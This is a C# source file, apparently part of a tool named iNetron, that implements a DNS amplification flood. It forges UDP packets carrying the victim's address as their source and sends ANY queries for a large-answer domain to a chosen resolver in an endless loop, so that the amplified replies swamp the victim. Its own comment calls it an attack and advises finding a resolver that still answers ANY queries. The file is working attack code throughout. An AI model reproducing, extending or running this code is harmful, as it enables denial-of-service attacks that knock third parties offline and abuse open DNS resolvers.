using System;
using System.Linq;
using PcapDotNet.Core;
using System.Threading;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.IpV6;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Transport;
using PcapDotNet.Core.Extensions;
using System.Net.NetworkInformation;

using ThreadState = System.Threading.ThreadState;

namespace iNetron.Core.Methods.Amp
{
    /// <summary>
    /// Pretty good attack but you'll need to find a DNS server which still supports ANY queries or this is useless.
    /// </summary>
    public class dns
    {
        private class sock
        {
            private PacketDevice nCard;
            private PacketCommunicator nIO;

            private string sIP, dIP;
            private ushort sP, dP;

            public sock(string target, string dns, ushort source = 53, ushort dest = 53)
            {
                sIP = target;
                dIP = dns;
                sP = source;
                dP = dest;

                var thisMacAddr =
                (
                    from nic in NetworkInterface.GetAllNetworkInterfaces()
                    where nic.OperationalStatus == OperationalStatus.Up
                    select nic.GetPhysicalAddress().ToString()

                ).FirstOrDefault();

                nCard = LivePacketDevice.AllLocalMachine.Where(a => a.GetMacAddress().ToString().Replace(":", "") == thisMacAddr).FirstOrDefault();

                if (nCard == default)
                    throw new Exception("Network Device Cannot Be Found");

                try { nIO = nCard.Open(PacketDevice.DefaultSnapshotLength, PacketDeviceOpenAttributes.Promiscuous, 1000); }
                catch { Console.Error.WriteLine("Open Network Failed"); }
            }
            private Packet forgeDNSPacket(string domain, bool ipv6)
            {
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = LivePacketDeviceExtensions.GetMacAddress((LivePacketDevice)nCard),
                    Destination = new MacAddress(string.Join(":", util.Lookup(((LivePacketDevice)nCard).GetNetworkInterface().GetIPProperties().GatewayAddresses[0].Address).GetAddressBytes().Select(x => x.ToString("X2")))),
                    EtherType = EthernetType.None,
                };

                IpV4Layer ipV4Layer = new IpV4Layer();
                IpV6Layer ipV6Layer = new IpV6Layer();

                if (!ipv6)
                {
                    ipV4Layer = new IpV4Layer
                    {
                        Source = new IpV4Address(sIP),
                        CurrentDestination = new IpV4Address(dIP),
                        Fragmentation = IpV4Fragmentation.None,
                        HeaderChecksum = null,
                        Identification = (ushort)new Random(DateTime.Now.Millisecond * DateTime.UtcNow.Millisecond).Next(1, 8192),
                        Options = IpV4Options.None,
                        Protocol = null,
                        Ttl = 100,
                        TypeOfService = 0,
                    };
                }
                if (ipv6)
                {
                    ipV6Layer = new IpV6Layer
                    {
                        Source = new IpV6Address(sIP),
                        CurrentDestination = new IpV6Address(dIP),
                    };
                }

                UdpLayer udpLayer = new UdpLayer
                {
                    SourcePort = sP,
                    DestinationPort = dP,
                    Checksum = null,
                    CalculateChecksumValue = true,
                };
                DnsLayer dnsLayer = new DnsLayer
                {
                    Id = (ushort)new Random(DateTime.Now.Millisecond * DateTime.UtcNow.Millisecond).Next(1, 8192),
                    IsResponse = false,
                    OpCode = DnsOpCode.Query,
                    IsAuthoritativeAnswer = false,
                    IsTruncated = false,
                    IsRecursionDesired = true,
                    IsRecursionAvailable = false,
                    FutureUse = false,
                    IsAuthenticData = false,
                    IsCheckingDisabled = false,
                    ResponseCode = DnsResponseCode.NoError,
                    Queries = new[]
                    {
                        new DnsQueryResourceRecord(new DnsDomainName(domain),
                            DnsType.Any,
                            DnsClass.None),
                    },
                    Answers = null,
                    Authorities = null,
                    Additionals = null,
                    DomainNameCompressionMode = DnsDomainNameCompressionMode.Nothing
                };

                PacketBuilder builder;

                if (ipv6)
                    builder = new PacketBuilder(ethernetLayer, ipV6Layer, udpLayer, dnsLayer);
                else
                    builder = new PacketBuilder(ethernetLayer, ipV4Layer, udpLayer, dnsLayer);

                return builder.Build(DateTime.Now);
            }
            public void send(string domain = "sni.cloudflaressl.com", bool ipv6 = false)
            {
                try { nIO.SendPacket(forgeDNSPacket(domain, ipv6)); }
                catch (Exception e) { Console.Error.WriteLine("Send DNS Fail " + e.ToString()); }
            }
        }
        private Thread tSendDNS;
        private sock cSock;
        private bool ip6;
        private string uri;

        public dns(string target, string dns, string query = "sni.cloudflaressl.com", ushort source = 53, ushort dest = 53, bool ipv6 = false)
        {
            ip6 = ipv6;
            uri = query;

            cSock = new sock(target, dns, source, dest);
            tSendDNS = new Thread(thread_SendDNS);
        }
        public void Start() => tSendDNS.Start();
        ~dns()
        {
            tSendDNS.Abort();
        }
        private void thread_SendDNS()
        {
            while(true)
            {
                if (tSendDNS.ThreadState != ThreadState.Running)
                    break;

                try { cSock.send(uri, ip6); }
                catch { Console.Error.WriteLine("Send DNS Failed"); }
            }

            return;
        }
    }
}